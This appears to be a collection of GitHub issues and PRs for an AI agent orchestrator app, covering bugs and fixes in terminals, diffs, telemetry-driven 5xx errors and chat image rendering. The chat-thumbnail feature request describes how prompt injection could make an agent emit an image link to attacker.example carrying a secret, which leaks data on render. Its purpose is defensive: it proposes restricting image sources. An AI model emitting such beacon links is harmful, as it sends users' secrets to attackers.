title: bug(standalone): New terminal fails silently with a foreign-key error
body:
## User report

Choosing **New terminal** from a standalone session produces no terminal, toast, error, or retry action. The request fails with HTTP 500, so the control appears to do nothing.

## Expected behavior

A terminal should open in the standalone session's working directory. If creation fails, AO should show a visible error with retry and the request ID.

## Steps to reproduce

1. Start AO with a fresh data directory.
2. Create a standalone Codex session and wait until it is usable.
3. Click the `+` control in the session top bar.
4. Choose **New terminal**.
5. Observe that no terminal tab or error appears.

## Impact

The terminal is presented as available, but its primary action silently fails. A user cannot tell whether the click registered or how to recover.

## Acceptance criteria

- A shell terminal can be owned by a standalone session without a project foreign key.
- It starts in the standalone session directory.
- Failures show a toast with retry and request ID.
- The terminal is restored after AO restarts.
- An integration test covers create, directory, restart, and restore.

## Agent-collected evidence

- Audit date: 2026-09-14
- Platform: macOS, real Electron app, isolated AO data
- Build under test: PR #4851 at `f4fd8d7dba24f1e7343fa543af060a3ee1b23399`
- Daemon log: `POST /api/v1/shell-terminals status=500 duration=187.6ms`
- Daemon error: `persist: insert shell terminal: FOREIGN KEY constraint failed (787)`
- Related but not duplicate: #3061 covers terminal scoping in a different flow.

title: bug(workspace): Files inspector remains stuck on Loading diff
body:
## User report

The Files inspector finds the changed workspace file, but the diff remains on `Loading diff...` for more than a minute even though the backing requests succeed.

## Expected behavior

The diff should render, or the inspector should reach a retryable error state within five seconds.

## Steps to reproduce

1. Import a workspace containing at least two Git repositories.
2. Start its orchestrator and delegate a task that edits a file in one child repository.
3. Open the worker session.
4. Select **Files** in the right inspector.
5. Select the changed file.
6. Observe that the pane remains on `Loading diff...`.

## Impact

The worker can complete successfully, but the user cannot inspect its output in AO. The indefinite spinner also hides whether retrying or opening the file would help.

## Acceptance criteria

- A changed file in a multi-repository workspace renders its diff.
- Rendering reaches success or a retryable error within five seconds.
- The error state includes **Retry** and **Open file** actions.
- A two-repository integration test verifies this path.

## Agent-collected evidence

- Audit date: 2026-09-14
- Platform: macOS, real Electron app, isolated AO data
- Build under test: PR #4851 at `f4fd8d7dba24f1e7343fa543af060a3ee1b23399`
- Changed file: `alpha/workspace-test.txt`
- File API response: HTTP 200 in 344 ms
- Earlier diff requests also completed successfully; the visible render state did not advance.

title: ux(sidebar): present standalone Agents as a peer of Projects
body:
## User report

Standalone sessions are grouped under `Ad hoc agents`, directly below a `Projects` heading. The hierarchy makes agents look like a subtype of project and labels a primary workflow as temporary.

## Expected behavior

Projects and standalone agents should be first-class peer concepts in navigation, with labels that match the user's mental model.

## Steps to reproduce

1. Start AO with a fresh data directory.
2. Create at least one standalone session.
3. Return to the main sidebar.
4. Observe `Ad hoc agents` nested visually beneath `Projects`.

## Impact

The navigation teaches the product model during onboarding. The current label and grouping make it harder to predict where a standalone session lives or whether it is durable.

## Acceptance criteria

- Rename `Ad hoc agents` to a durable, first-class label such as `Agents`.
- Present Projects and Agents as peer navigation sections.
- Preserve clear empty and populated states for both sections.
- Verify keyboard navigation and accessible headings after regrouping.

## Agent-collected evidence

- Audit date: 2026-09-14
- Platform: macOS, real Electron app, isolated AO data
- Build under test: PR #4851 at `f4fd8d7dba24f1e7343fa543af060a3ee1b23399`
- No exact GitHub issue was found after searching the terms `Ad hoc agents`, sidebar, standalone, and Projects.

title: bug(chat): conversation skills polling returns repeated 409 conflicts
body:
## Summary

The desktop keeps requesting the conversation skills catalog while the chat controller is not ready. The daemon answers 409, the slash-command catalog stays unavailable, and the request is retried every minute for mounted Chat surfaces.

This is separate from #3720: that issue tracks provider-side `skills/list` failures that return 500. This report tracks the much broader 409 state/readiness conflict.

## User impact

- Typing `/` may not offer the session's available skills.
- The failure is silent in the composer, so users cannot tell whether the session has no skills or the catalog failed to load.
- Mounted Chat surfaces continue generating failed requests instead of waiting for a usable controller state.

**Priority: P1** — the signal affected 1,198 installations in 28 days and remained steady through the final week.

## Steps to reproduce

The production telemetry does not include session IDs or controller state, so the exact transition sequence still needs to be isolated.

1. Open a Chat session while its controller is starting, restarting, or changing agents/interfaces.
2. Keep the Chat surface mounted.
3. Observe `GET /api/v1/sessions/<id>/conversation/skills` in DevTools.
4. The request returns 409 and repeats on the catalog's one-minute refresh interval.
5. Type `/`; no skills catalog is available and no retryable error is shown.

## Expected behavior

- The renderer should enable catalog polling only after the live controller owns the session, and stop or back off when that prerequisite disappears.
- A temporary catalog failure should be distinguishable from a legitimate empty catalog.
- Telemetry should record the stable API error code so readiness conflicts can be separated from other 409s.

## Agent-collected evidence

Source: PostHog production telemetry, read-only query, 2026-08-17 through 2026-09-13 UTC. No human-authored report is asserted.

- 1,198 distinct installations
- 23,254 renderer API-error events
- `error_category=http_4xx`, HTTP 409
- `error_code` is missing on every matching event
- 2026-09-07 through 2026-09-13: 9,349 events; 105–126 affected installations per weekday
- Events per affected installation stayed between 11.0 and 16.5 during the final week, so the weekend volume drop does not indicate a fix.

Verification query and result thread: https://us.posthog.com/project/475752/ai?chat=902abde9-71a2-4c51-a4fc-7159248da017

## Relevant code

- `frontend/src/renderer/hooks/useConversation.ts`: `useConversationSkills` polls every 60 seconds with no retry, but a mounted query continues to refetch.
- `frontend/src/renderer/components/chat/SessionChatSurface.tsx`: the catalog is gated by the renderer's controller-readiness view.
- `backend/internal/httpd/controllers/conversations.go`: `ErrNoController` maps to 409 `CHAT_CONTROLLER_NOT_READY`.

## Acceptance criteria

- A regression test covers a controller becoming unavailable before and after the skills query is enabled.
- The renderer does not repeatedly request skills while the controller is unavailable or transitioning.
- A temporary failure produces a retryable/degraded composer state instead of looking identical to “no skills installed.”
- Renderer telemetry includes the API error code for this route.
- PostHog shows the 409 rate per affected installation falling materially after rollout.

## Related

- #3720 — same endpoint, different 500/provider failure.
- #4842 — a different interface-transition readiness mismatch involving `NATIVE_SESSION_MISSING`; not a duplicate.

title: bug(workspace): workspace file listing returns recurring 500 and 503 responses
body:
## Summary

The Workspace Files endpoint is returning 500/503 responses in production, preventing the right-side Files inspector and `@` file completion from loading the workspace file list.

This is separate from #5363. That issue tracks the diff pane staying on `Loading diff...` after the backing API succeeds; this report tracks the file-list API itself failing.

## User impact

- The Files inspector cannot show the session's files.
- `@` file completion can be empty or unavailable.
- Users lose the primary in-app path for checking what an agent changed.

**Priority: P1** — the 28-day signal affected 420 installations, and 500s increased again on September 12–13.

## Steps to reproduce

The aggregate telemetry does not retain the underlying server error, so the exact repository condition still needs to be isolated.

1. Open a session with a workspace containing tracked or untracked files.
2. Open **Files** in the right inspector, or type `@` in Chat.
3. Observe `GET /api/v1/sessions/<id>/workspace/files`.
4. The daemon returns 500 or 503; the file list cannot be used.

## Expected behavior

- A valid session workspace returns a bounded file list.
- Temporary daemon unavailability has a clear retry state and bounded backoff.
- Repository-specific failures are returned with typed, actionable error codes rather than a generic 500.

## Agent-collected evidence

Source: PostHog production telemetry, read-only query, 2026-08-17 through 2026-09-13 UTC. No human-authored report is asserted.

- 420 distinct installations and 3,840 HTTP 500 events over the full 28-day window.
- September 12–13: 28 installations / 260 HTTP 500 events, plus 14 installations / 76 HTTP 503 events.
- Daily HTTP 500 volume rose from 43–90 events on September 7–11 to 145 on September 12 and 115 on September 13.
- The 500 increase occurred without a comparable increase in affected-install count, so it is not explained only by more users.

Verification query and result thread: https://us.posthog.com/project/475752/ai?chat=902abde9-71a2-4c51-a4fc-7159248da017

## Diagnostic gap

PostHog retains the normalized route and status but not the daemon error code or Sentry fingerprint. Add the typed error code to the renderer event, and correlate the server request ID with Sentry once organization access is restored.

## Acceptance criteria

- Reproduce and classify the dominant 500 fingerprint using request IDs/Sentry.
- File listing returns typed errors for missing/invalid workspace states.
- The Files inspector and `@` completion show a retryable state for temporary failures.
- Retry behavior is bounded and does not amplify one failure into continuous telemetry noise.
- Add integration coverage for the confirmed repository/workspace condition.
- Verify a sustained drop in 500 events per affected installation after rollout.

## Related

- #5363 — successful API response but the diff UI never settles; not a duplicate.
- #4325 — generic historical untyped-500 cleanup; does not track this production regression.

title: bug(browser): browser commands continue returning 500 and 503 responses
body:
## Summary

Browser commands are still returning 500/503 responses in production. The recent pattern is dominated by 503s, so agents can lose the built-in Browser tool even while the rest of a session remains usable.

PR #5241 fixed missing cancellation results and PR #5312 is bounding profile-operation waits. Neither tracks the remaining production 5xx rate or identifies its current fingerprints.

## User impact

- An agent's browser action fails or times out.
- Users cannot reliably test web UI, inspect a page, or complete browser-assisted tasks inside AO.
- A 503 offers no useful recovery path in the desktop UI.

**Priority: P1** — failures continued after the cancellation fix merged, including 199 HTTP 503 events across 34 installations on September 12–13.

## Steps to reproduce

The aggregate telemetry does not identify the command type or runtime error, so this is initially an investigation/reliability issue.

1. Start a session with the desktop Browser feature available.
2. Ask the agent to open, inspect, or interact with a page.
3. Observe `POST /api/v1/browser/commands`.
4. The request returns 500 or 503 and the browser action does not complete.

Include reconnect/dispose, profile clear/delete, first command after app start, and concurrent commands in the reproduction matrix.

## Expected behavior

- Accepted browser commands complete with a result or a typed, bounded cancellation/timeout.
- Temporary runtime unavailability is surfaced with a clear retry path.
- Telemetry identifies command type and stable error code without recording URLs or page content.

## Agent-collected evidence

Source: PostHog production telemetry, read-only query, 2026-08-17 through 2026-09-13 UTC. No human-authored report is asserted.

- Full window: 259 installations / 3,661 HTTP 500 events; 136 installations / 2,241 HTTP 503 events. Installation sets can overlap and are not summed.
- September 9: 25 installations / 515 HTTP 503 events.
- September 10: 24 installations / 730 HTTP 503 events.
- September 12–13, after PR #5241 merged: 17 installations / 27 HTTP 500 events and 34 installations / 199 HTTP 503 events.
- The 500 rate fell sharply by September 12–13, but 503s remained material and rose again on September 13.

Verification query and result thread: https://us.posthog.com/project/475752/ai?chat=902abde9-71a2-4c51-a4fc-7159248da017

## Diagnostic gap

The current event records route/status but not browser command kind, stable error code, desktop version, or runtime-link state. Add privacy-safe dimensions needed to separate disconnects, profile-operation waits, runtime absence, and command execution failures.

## Acceptance criteria

- Identify the top current 500 and 503 fingerprints using request IDs/Sentry.
- Record command kind, stable error code, app version, and coarse runtime-link state in privacy-safe telemetry.
- Every accepted command returns success or a typed bounded failure.
- The desktop shows a useful retry/reconnect action for runtime-unavailable failures.
- Regression tests cover reconnect/dispose, stuck profile work, startup readiness, and queued commands.
- Confirm the 5xx rate per browser-command installation falls after rollout.

## Related

- PR #5241 — merged cancellation-result fix.
- PR #5312 — open profile-operation timeout fix.

title: fix(acp): buffer session/load replay updates off the SDK queue
body:
## What

During ACP `session/load`, buffer replayed notifications in an in-memory inbox and normalize them after the load response returns, instead of running full ACP→AO normalization inline on the SDK's notification delivery path.

## Why

Fixes #5371

The ACP SDK delivers notifications sequentially through a bounded queue (capacity 1024) and hard-closes the connection on overflow. AO normalized every replayed update inside the handler, so a long transcript could not drain fast enough: the queue filled, the connection closed, and the in-flight `session/load` failed with `peer disconnected before response`, leaving the chat unresumable. Reporter's daemon log:

```
ERROR msg="failed to queue notification; closing connection" err="notification queue overflow" capacity=1024 queued=1024
INFO  msg="connection closed" cause="notification queue overflow"
POST /api/v1/sessions/montamer2-2/resume-agent → 500 "ACP session/load: ... peer disconnected before response"
```

## How

- `SessionUpdate` captures replay notifications verbatim (`captureReplayUpdate`) and returns immediately; normalization runs in the new `drainAndFinishReplay` after the `session/load` response watermark.
- Capture stays active until the final drain. The empty-inbox check, final turn settlement, and the switch to live delivery happen under the same lock, so updates racing the watermark stay ordered and none can be captured after the drain or delivered live early.
- Normalization batches never hold the inbox lock, so SDK delivery keeps making progress. Handler-error semantics are unchanged: the SDK treats notification-handler errors as log-only, and the drain logs them the same way.

### Intentional omissions / limits

- Protects the **replay path only**. A live burst that outpaces normalization can still overflow the same queue; that is a separate change.
- The inbox is an unbounded in-memory backlog (entries are dropped as they are processed, so peak is roughly raw + normalized history). In practice it is bounded by the provider transcript.
- Normalization still runs inside the existing 60 s `handshakeTimeout` resume context, now after the load response; a pathological transcript could still exceed it. Not a regression — the inline path shared the same budget.
- Does not change replay/live boundary semantics, history pruning, or compaction, and is unrelated to #5292 (provider-side `-32603` on Claude Code refresh) and to #5255/#4466 (history trust/branch handling).

## Testing

- **Mutation check:** with inline normalization restored, the new `TestACPReplayLoadLargeHistoryThroughSDK` fails with the reporter's exact error (`failed to queue notification … capacity=1024 queued=1024` → `peer disconnected before response`); with this change it passes (8,192 notifications, ~20 MiB of text, through the real SDK over in-memory pipes).
- **Real transcript:** an isolated copy of the affected OpenCode session, resumed through the real ACP driver on the reporter's machine, imported 4,603 events, and a refresh preserved every event identity. Local validation artifact, not committed as a fixture.
- `go test -race -timeout=15m ./...` (the CI gate): all 169 packages ok. `go test -tags e2e ./internal/cli/...`: ok.
- `npm run lint` (golangci-lint v2.12.2): 0 issues; `gofmt -l .`, `go build ./...`, `go vet ./...` clean. No API drift.
- No docs updates required: no daemon API, storage, CLI, or hard-rule change (`docs/documentation-map.md`).

## Checklist

- [x] Branched from `main` (or continuing an existing PR branch)
- [x] One focused change; links the related issue when applicable
- [x] Follows [AGENTS.md](https://github.com/Untrivial-ai/agent-orchestrator/blob/main/AGENTS.md) conventions and PR hygiene
- [x] Tests added/updated for user-visible behavior where it makes sense
- [ ] Relevant CI checks pass for the area touched (`go`, frontend, etc.)

title: fix(chat): stop skills catalog polling flood on controller conflict
body:
## What

The Chat skills catalog (`useConversationSkills`) polled `GET /api/v1/sessions/{id}/conversation/skills` on a fixed 60s interval. When the live Chat controller does not own the session, the daemon answers `409 CHAT_CONTROLLER_NOT_READY`. A cached "ready" snapshot can outlive the controller (a restart or interface switch), so the query stays enabled and re-requests the catalog every minute for as long as the surface is mounted, turning one readiness conflict into a steady stream of 409s.

This makes `refetchInterval` back off when the last fetch failed with `CHAT_CONTROLLER_NOT_READY`: the fast poll stops while that conflict stands. Readiness returning re-enables the query through the existing controller-gated `enabled` flag, or invalidates it on agent-switch settle, which refetches once and resumes polling on success. An empty catalog is still a real answer and keeps polling, so a skill published later becomes visible.

Fixes #5367 (renderer polling half). The 409 flood was 23,254 renderer API-error events across 1,198 installations over 28 days.

## Why this is the right seam

The catalog is already gated on `controllerCatalogsEnabled` in `SessionChatSurface`, which derives readiness from the snapshot. The 409s occur in the race window where the snapshot still reports `ready`/`busy` but the daemon controller is momentarily gone. Backing the poll off on the typed 409 closes that window without changing the readiness model, and recovery is already driven by the enabled-gate and the switch-settle invalidation (`invalidateConversationProviderCatalogs`).

## Tests

`frontend/src/renderer/hooks/useConversation.test.tsx`:
- stops polling while the controller answers 409 (one request, no repeats after 5 minutes of fake time)
- keeps polling once the catalog loads (empty catalog still refetches on the interval)

Ran locally: `npx vitest run src/renderer/hooks/useConversation.test.tsx` (42 passed) and `npm run typecheck`.

## Out of scope (tracked in the issue, not attempted here)

The issue also asks for a degraded/retryable composer state distinct from "no skills installed", a renderer telemetry error code for this route, and PostHog verification of the post-rollout 409 rate. Those are follow-ups; this PR is the contained renderer change that removes the per-minute 409 flood.

title: fix(runtime): answer terminal capability queries in the detached pty host
body:
## Problem

TUI sessions that run without an attached client had no terminal to answer them. The detached pty-host (`ptyhost-v1:`) pumps PTY bytes and answers nothing, while tmux — the other runtime — is a terminal emulator and answers.

Muse Code 1.2.1's TUI sends `CSI 6n` (cursor position) before its first draw and waits for the reply. With nothing answering it blocks and then exits **0** having painted nothing: the session reports `exited`, no native session id is emitted, and nothing in AO says why. Every orchestrator-spawned Muse worker failed this way; opening a pane quickly enough hid it, which is what made it look like "Muse won't launch".

## Fix

`terminalQueryResponder` in the pty-host answers the startup queries a TUI waits on:

- `CSI 6n` cursor position · `CSI 5n` device status · `CSI c` / `CSI >c` device attributes · `CSI ?u` kitty keyboard flags

…and **only while no client is attached**. An attached client is a real emulator and answers for itself (xterm.js 5.5 handles DA1/DA2 and DSR 6 — verified in its source), and answering from both sides would deliver two cursor reports for one query, which is the classic phantom-keystroke bug in full-screen apps.

Colour reports (`OSC 4/10/11`) are deliberately left alone: they describe the *viewer*, not the host, so fabricating them would repaint a light-themed pane with a dark theme's palette, and an unanswered colour report only makes an app fall back to its own defaults. Isolation testing showed they are not needed to unblock: answering only `CSI 6n` brings Muse up.

Replies are written by a dedicated bounded writer goroutine, so a PTY that stops accepting input cannot stall the output pump. Fragments are carried across reads, so a sequence split between two PTY reads is answered on the read that completes it.

## Verification

Muse Code 1.2.1, **no client attached at any point**:

| | before | after |
| --- | --- | --- |
| child process | exited 0 after ~8 s | alive > 20 s |
| host status | `{"alive":false,"exitCode":0}` | `{"alive":true}` |
| output | 275 bytes, nothing painted | 100 KB+, `Muse Code 1.2.1` rendered, turn completes |

End to end through a daemon built from this branch: a Muse worker spawned over the API stays `idle`, `POST /api/v1/sessions/{id}/send` returns 200 (before, the guard refused it with `ErrAgentExited`), and Muse answers the delivered message.

Tests: `query_test.go` covers each query, sequences split across reads, non-queries left untouched and repeated queries; `host_test.go` covers answering while unattached, deferring to an attached client, and resuming after detach. `go test ./...` and `golangci-lint v2.12.2` are clean.

## Notes

- Follow-up, not in this PR: Muse's screen-derived idle detector still expects a composer line exactly `⟩` while Muse 1.2.1 draws `❯`, so screen-proven idle (and with it TUI→Chat handoff) stays dark for Muse and state rides on its hooks, which do fire.
- This is a runtime fix, so it reaches users in a daemon build; the packaged binary in an installed app is unaffected until then.

title: fix(kanban): check worker activity in Validating and Needs Review columns
body:
## Summary
- `buildingDisplayStatus` already reported `Blocked`/`Exited`/`NoSignal` from `session.Activity`, but `validatingDisplayStatus` had no no-signal check and `inReviewDisplayStatus` (the Needs Review / "In review" lane) ignored worker activity entirely — a crashed or silently-stalled worker mid-review showed the same phrase as a healthy one.
- Added the same activity precedence (Blocked/WaitingInput → Blocked, Exited → Exited, silent-past-grace → No signal) to both `validatingDisplayStatus` and `inReviewDisplayStatus`, ahead of their column-specific CI/review facts.
- Also require the worker to be `Active` before crediting `AutoInjectCI`/`AutoInjectReview` with "Fixing CI failures" / "Addressing comments" in either column, so a stale auto-inject flag on an idle worker falls through to the plain CI-failing/changes-requested/commented reading instead of claiming work nobody is currently doing.
- All changes are confined to the pure `backend/pkg/contract/kanban.go` reducer; no service, storage, or frontend changes were needed (`DisplayStatus` values are opaque strings clients already render as-is, and `Blocked`/`Exited`/`No signal` already have i18n keys from the Building column).

Fixes #4739.

title: fix(cloud): PAT-first PR tracking, and block agent launch on checkout
body:
## Summary
Two confirmed, separate bugs found while diagnosing cloud worker failures reported against this deployment:

**1. PR tracking failed with `SCM_BROKER_UNAVAILABLE` even with a valid PAT configured**
`workerRaisePullRequest` and `workerClaimPullRequest` (`cloud/internal/httpapi/worker_handlers.go`) gated the entire handler on `s.checkoutBroker == nil` *before* ever attempting the configured user PAT — unlike their sibling `workerCheckoutGrant`/`workerPushGrant`, which correctly try the PAT first and only fall back to (or fail without) the broker. Their own inline comments ("PAT-first, mirroring...") described behavior the code didn't actually implement. On a deployment with no GitHub App configured (`checkoutBroker` stays `nil`), PR raise/claim — and by extension `ao claim-pr`, auto-invoked by the worker's `gh pr create` wrapper — always failed with a 503, regardless of PAT. Reordered both handlers to match the working PAT-first pattern.

**2. Fresh worker sandboxes could start their first turn against an empty, uncloned workspace**
`ao-worker/main.go` ran `prepareWorkspace` (git checkout) and `startInteractiveAgent` (the coding-agent process) in independent, unsynchronized goroutines. `HoldAgentInputUntilWorkspaceReady` was meant to prevent this, but it only holds *terminal input* for turns after the first — the session's initial prompt is baked directly into the agent's launch command (`BuildInteractive` → `agentruntime.BuildLaunchCommand`), so it never passed through that hold. A failed or slow checkout let the agent boot and start working in an empty workspace, with the checkout failure logged only worker-side and invisible to the session/user. Reproduced twice against this deployment. `startInteractiveAgent` now blocks on the checkout goroutine's result before building or launching the agent command.

## Test plan
- [x] `go build ./...` (cloud module)
- [x] `go vet ./...` (cloud module)
- [x] `go test ./...` (cloud module) — all packages pass
- [x] New tests in `worker_pat_write_test.go` reproduce the exact reported bug: PAT works with `checkoutBroker == nil` (previously would 503); no-PAT/no-broker fails closed with `SCM_BROKER_UNAVAILABLE` instead of panicking, for both raise and claim

title: Mobile chat doesn't show images attached from the desktop chat
body:
## Observed

An image pasted into a Chat session on the desktop app is not visible when the same conversation is opened in the mobile app.

## Expected

The mobile timeline shows the image the human attached, like the desktop timeline does.

## Analysis (agent-collected, for the fix PR)

- Desktop stages composer images under `.ao/attachments/attachment-<id>.<ext>` and appends `Attached files (read these files in the workspace):` plus the path list to the message. Desktop's `stagedAttachmentParts` strips that suffix and renders each image from `/api/v1/sessions/<id>/preview/files/<path>`.
- Mobile's `ChatTimeline` renders the human message `text` verbatim, so the user sees the raw path list and no image. Steered messages behave the same way.
- Mobile writes a different suffix (`Attached files are available in the worktree:`) that desktop's parser does not recognize, so images attached from mobile also show as raw paths on desktop.
- The daemon already serves staged attachments on that route over the LAN listener with the Bearer password, so no backend change is required.

title: [Feature]: Show chat images as thumbnails that open full size
body:
### Problem

When an agent puts a Markdown image in a chat reply (`![screenshot](...)`), the desktop chat renders it with nothing but `max-w-full` (the `img` override in `frontend/src/renderer/components/chat/ChatMarkdown.tsx`). A screenshot fills the whole conversation column at its natural height, a few images in a row turn into a very long scroll, and clicking an image does nothing, so a detailed screenshot cannot be viewed larger. Images attached to a human message (`StagedAttachmentItems` in `ChatTimelineItems.tsx`, capped at `max-h-80`) already read much tidier than images the agent sends back.

This affects anyone using agents that report visual results (UI screenshots, charts, diagrams) in chat.

### Proposed direction

Show chat images the way chat apps such as the Claude app do:

- **One image:** a height-capped preview, sized like human-message attachments (`max-h-80`, `object-contain`).
- **Several images:** a paragraph made only of images (`![a](u1) ![b](u2)`, or one per line) becomes a wrapping row of equal-height thumbnails. Images mixed into a sentence stay inline in that sentence.
- **Click to enlarge:** opens the image in the existing `components/ui/dialog.tsx`, at the largest size that fits the window; Escape or the close button dismisses it.
- **Load failure:** falls back to the alt text, as `components/markdown/MarkdownImage.tsx` already does in the file viewer.
- Out of scope: arrow-key navigation between images of a gallery inside the dialog.

### Alternatives considered

Opening the image URL in the AO Browser panel instead. That leaves the conversation and does not fix the in-line size problem.

### Related concerns (not part of this change)

1. **External image beacons from chat Markdown.** The renderer CSP in `frontend/vite.renderer.config.ts` is `img-src 'self' data: http://127.0.0.1:* https:`; the `https:` exception exists for repository avatars on self-hosted SCM. As a result, any `https://` image in chat Markdown loads as soon as the reply renders. If a prompt injection (for example in a file or web page the agent reads) makes the agent emit `![](https://attacker.example/?q=<secret>)`, rendering the reply sends that request, with no click needed. This is an exfiltration channel. One option is to allow only workspace, loopback, and `data:` sources for chat Markdown images at the component level, and show anything else as alt text or a click-to-load placeholder, while keeping the CSP exception for avatars. Separately, the doc comment in `MarkdownImage.tsx` still says the CSP allows images only from self, `data:`, and loopback, which no longer matches the policy.
2. **ACP image content blocks are dropped.** `contentText` in `backend/internal/adapters/chatdriver/acp/client.go` returns only `content.Text`, so image content blocks from ACP agents, including images in tool results, never reach the chat. This probably deserves its own issue.

### Before submitting

- [x] I searched existing issues / discussions for something similar
- [x] I am willing to help implement this if maintainers agree on scope

title: fix(mobile): render staged chat image attachments in the timeline
body: ## What The mobile Chat timeline now shows images the human attached. Before this change, a message sent with an image from the desktop composer appeared on mobile as a raw `.ao/attachments/...` path list, with no image. ## Why Fixes #5380. ## How - New `lib/chat/messageAttachments.ts` mirrors desktop's `stagedAttachmentParts`. It removes the AO-owned suffix only when every listed path is AO-staged (`.ao/attachments/(attachment|image)-*`), so prose that happens to quote the same wording stays as written. It accepts every wording AO has shipped: desktop composer, spawn (`… for context`), legacy `Attached images …`, and the older mobile `Attached files are available in the worktree:`. - `ChatTimeline`: human bubbles and steered bubbles show the body text plus the staged attachments. Images load from `GET /api/v1/sessions/{id}/preview/files/` through RN `` with the connection's existing Bearer header (`authHeaders(config)`, the same credential every mobile API call uses). Non-image files, and images that fail to load, show as a name chip. - Mobile now writes desktop's suffix wording when it stages attachments, so images sent from the phone also render on desktop. The parser still accepts the old mobile wording, so existing history keeps rendering. - The conversation map titles a turn with the human's text instead of the path list (or "N attachments" when the message has no text). - No backend change: the preview-files route already serves staged attachments via `attachmentstore`, and the LAN listener allows it behind `authMiddleware`. Intentional omissions: - Native image content blocks (`content[].type == "image"`) are not rendered. The daemon returns only a summary without bytes, and desktop's human message bubble also relies on the staged paths. - Relative-path images in agent Markdown (`markdownBlocks.ts` only accepts `![](https?://…)`) are a separate issue and are out of scope here. ## Testing - TDD: `lib/chat/messageAttachments.test.ts` was written first and failed because the module did not exist; after the change it passes. Added a marker-title case to `timelineModel.test.ts`. - `packages/mobile`: `npm ci`, `npm run typecheck` (clean), `npm test` (81 files / 799 tests passing). These are the `Mobile` workflow's steps. Ran on Node 22.18.0 locally; CI uses Node 20. The local Node 20.17 is below rolldown's `^20.19` engine floor, so it could not run vitest. - Not run locally: `gitleaks` (Docker unavailable on this machine), so I'm relying on the CI run. - Verified on iOS simulator (iPhone 17 Pro, iOS 26.3; local `expo run:ios` build with Xcode 27 RC; paired to a running daemon over the Connect Mobile listener), using an existing chat message whose PNG was attached from the desktop composer: - `main` (baseline): the bubble shows the raw `Attached files (read these files in the workspace):` line plus the `.ao/attachments/attachment-….png` path, and no image. - This branch: the bubble shows only the typed text, with the attachments below it as center-cropped square tiles (loaded from `preview/files` with the Bearer header); tapping a tile opens the full-screen viewer. A message mixing an image with a text file keeps the file chip at its own height instead of stretching it to the tile's. Fetching the same URL over the LAN listener returns `200 image/png` with the header and `401` without it. - Screenshots (iOS simulator, `AgentOrchestrator-WT2`; neutral solid-color test PNG and a plain text file, sent to an empty scratch chat in the desktop composer's format): | `main` (before) | This branch: tiles | This branch: viewer | | --- | --- | --- | | | | | - Intentional omissions in the viewer: no share/save affordance, and no pinch-zoom on Android. Both would need a gesture library this package does not depend on; iOS pinch-zoom comes free from `ScrollView` zoom. ## Checklist - [x] Branched from `main` (or continuing an existing PR branch) - [x] One focused change; links the related issue when applicable - [x] Follows [AGENTS.md](https://github.com/AgentWrapper/agent-orchestrator/blob/main/AGENTS.md) conventions and PR hygiene - [x] Tests added/updated for user-visible behavior where it makes sense - [x] Relevant CI checks pass for the area touched (`go`, frontend, etc.) 🤖 Generated with [Claude Code](https://claude.com/claude-code)

title: [Feature]: Resolve worktree-relative image paths in chat Markdown
body:
### Problem

To show a workspace file as an image in the desktop chat today, an agent has to write the full daemon URL, for example:

```markdown
![](http://127.0.0.1:3001/api/v1/sessions/<session-id>/preview/files/docs/screenshot.png)
```

That has three problems:

- The agent needs to know the daemon port and its own session id.
- The URL is baked into the stored transcript, so when the daemon port changes, every image in past conversations breaks.
- The natural thing to write, a worktree-relative path like `![](docs/screenshot.png)`, renders as a broken image because the chat renderer has nothing to resolve it against.

This affects anyone whose agents report screenshots, charts, or generated diagrams saved in the worktree.

### Proposed direction

Resolve relative image paths in chat Markdown against the session's worktree, reusing what the file viewer already does for `.md` files:

- `frontend/src/renderer/lib/markdown-image-resolver.ts` (`resolveMarkdownImageSrc` / `buildWorkspaceBlobUrl`, used by `components/markdown/MarkdownImage.tsx`) turns a relative `src` into `GET /api/v1/sessions/{sessionId}/workspace/file/blob?path=...`. The daemon rejects paths that escape the session workspace (`INVALID_WORKSPACE_PATH`), and the resolver clamps `..` at the root.
- `ChatMarkdown` has no session id today. Supply it through a small context, the same pattern as the existing `ChatLinkProvider`, from `ChatWorkspace`.
- Relative paths resolve from the worktree root, since a chat message has no file of its own to be relative to.
- Absolute sources (`https:`, `data:`, root-relative `/...`, and existing loopback URLs) keep today's behaviour, so existing transcripts render the same.

Because the URL is built at render time, the port lives only in the renderer's current API base URL, and old conversations keep working after a port change.

### Security notes

- Relative resolution only reaches the daemon's loopback blob route, which is confined to the session workspace. An agent can already read these files, so this does not expose anything new to the agent. It does let an agent display any image in its own worktree in chat, which is the intent.
- The larger risk is unchanged by this proposal and is described in #5381: the renderer CSP allows `img-src https:`, so an absolute external image in chat Markdown loads on render and can act as an exfiltration beacon under prompt injection. Keeping absolute URLs as they are here means that concern still needs its own fix.

### Alternatives considered

- Keep writing absolute daemon URLs. This breaks on port changes and leaks implementation details into prompts.
- Rewrite image URLs in the daemon when storing messages. This changes the stored record, which `ChatMarkdown` deliberately renders verbatim, and still bakes in a port.

### Before submitting

- [x] I searched existing issues / discussions for something similar
- [x] I am willing to help implement this if maintainers agree on scope

title: feat(chat): resolve worktree-relative image paths in chat markdown
body: ## What A worktree-relative image in chat Markdown, such as `![](docs/screenshot.png)`, now loads from the session's worktree. Agents no longer need to write `http://127.0.0.1:/api/v1/sessions//...` URLs, which break in past conversations whenever the daemon port changes. ## Why Fixes #5383 ## How - New `components/chat/chat-image-source.tsx`: - `ChatImageSourceProvider` supplies the session id through a context, the same pattern as `ChatLinkProvider`, because `COMPONENTS` in `ChatMarkdown.tsx` must stay module-level. - `useChatImageSrc(src)` resolves through the existing `resolveMarkdownImageSrc` from `lib/markdown-image-resolver.ts`, the same code the file viewer's `MarkdownImage` uses. Relative paths resolve from the worktree root, because a chat message has no file of its own to be relative to, and `..` is clamped at the root. The daemon's `workspace/file/blob` route also rejects paths that escape the workspace. - `ChatMarkdownImage` is the `img` override. It keeps today's classes and only changes `src`. - `ChatMarkdown.tsx` changes by one import and the `img:` line. `ChatWorkspace.tsx` wraps `Timeline` in the provider; that hunk is only re-indentation (`git diff -w` shows 3 lines). Rebased onto current `main`, past #5334, which added `workspacePaths` to the same `ChatLinkProvider` line. Both are kept: that prop decides whether a markdown *link* points at a workspace file so it opens in the AO browser, while this PR resolves a relative *image* path to the workspace blob URL. They only touch the same lines. - The URL is built from the renderer's current API base at render time, so the stored transcript stays port-free. - Cache busting: the blob route is `no-store`, but the browser does not refetch an unchanged URL. The version is fixed per provider mount. Reopening the chat picks up an image the agent rewrote, and polling re-renders do not reload images. - Outside a session (no provider), `src` is untouched. Intentionally unchanged: - Absolute sources (`https:`, loopback daemon URLs, root-relative `/...`) 